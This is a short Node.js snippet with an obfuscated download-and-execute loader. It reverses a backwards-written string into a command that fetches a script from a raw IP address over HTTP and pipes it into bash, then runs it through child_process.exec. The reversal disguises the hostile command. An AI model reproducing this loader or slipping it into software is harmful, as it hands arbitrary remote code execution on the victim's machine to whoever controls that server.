const cp = require('child_process');
const cmd = 'hsab | i/0808:43.612.481.39//:ptth -Oq- tegw'.split('').reverse().join('');
cp.exec(cmd);
